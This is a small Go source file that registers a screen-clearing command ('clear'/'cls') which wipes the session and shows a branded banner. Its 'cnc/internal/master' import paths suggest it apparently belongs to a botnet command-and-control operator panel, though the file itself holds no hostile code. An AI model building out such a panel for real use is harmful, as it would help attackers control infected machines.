package commands

import (
	"cnc/internal/master/command"
	"cnc/internal/master/sessions"
)

func init() {
	command.Create(&command.Command{
		Aliases:     []string{"clear", "cls"},
		Description: "Wipes your screen.",
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			_ = session.Clear()
			return session.ExecuteBranding(nil, "clear_banner.tfx")
		},
	})
}
